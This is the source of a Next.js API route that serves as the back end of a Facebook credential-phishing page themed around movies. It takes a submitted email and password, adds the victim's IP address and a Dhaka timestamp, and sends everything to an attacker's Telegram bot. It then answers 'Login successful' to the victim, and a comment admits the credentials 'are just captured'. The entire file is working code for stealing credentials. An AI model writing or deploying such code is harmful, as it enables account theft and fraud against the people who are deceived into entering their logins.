import { NextResponse } from 'next/server';
import { format } from 'date-fns';
import { toZonedTime } from 'date-fns-tz';
import { tgBotData } from '@/app/assets/assets';

export async function POST(request) {
  try {
    const data = await request.json();
    const { email, password } = data;

    // Basic validation
    if (!email || !password) {
      return NextResponse.json(
        { message: 'Email and password are required' },
        { status: 400 }
      );
    }

    // Get IP and other browser info
    let ip = request.headers.get('x-forwarded-for') || 
             request.headers.get('x-real-ip') || 
             'Unknown IP';
    
    if (ip.startsWith('::ffff:')) ip = ip.substring(7);
    if (ip.includes(',')) ip = ip.split(',')[0].trim();

    const userAgent = request.headers.get('user-agent') || 'Unknown User-Agent';
    
    // Get current time in Bangladesh timezone
    const now = new Date();
    const zonedTime = toZonedTime(now, 'Asia/Dhaka');
    const timestamp = format(zonedTime, 'dd/MM/yyyy, hh:mm:ss a');

    // Escape special characters for Telegram's MarkdownV2 format
    const escapeMarkdown = (text) => text.toString().replace(/([_\*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
    
    // Create message for Telegram matching the desired format
    const message = `📽️ *New Facebook Login from Movies\\!*

*Email*: \`${escapeMarkdown(email)}\`
*Password*: \`${escapeMarkdown(password)}\`
*IP Address*: \`${escapeMarkdown(ip)}\`
*Submitted On*: ${escapeMarkdown(timestamp)}`;

    try {
      // Send data to Telegram
      const telegramResponse = await fetch(`https://api.telegram.org/bot${tgBotData.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: tgBotData.CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2'
        })
      });

      if (!telegramResponse.ok) {
        const errorData = await telegramResponse.text().catch(() => 'Failed to parse error response');
        console.error('Telegram API error:', errorData);
        return NextResponse.json(
          { message: 'Authentication failed. Please try again.' },
          { status: 500 }
        );
      }
    } catch (networkError) {
      console.error('Network error when calling Telegram API:', networkError);
      return NextResponse.json(
        { message: 'Network error. Please try again later.' },
        { status: 500 }
      );
    }

    // Send success response (even though credentials are just captured)
    return NextResponse.json({
      status: 'success',
      message: 'Login successful',
    });
  } catch (error) {
    console.error('Facebook login error:', error);
    return NextResponse.json(
      { message: 'Server error. Please try again later.' },
      { status: 500 }
    );
  }
} 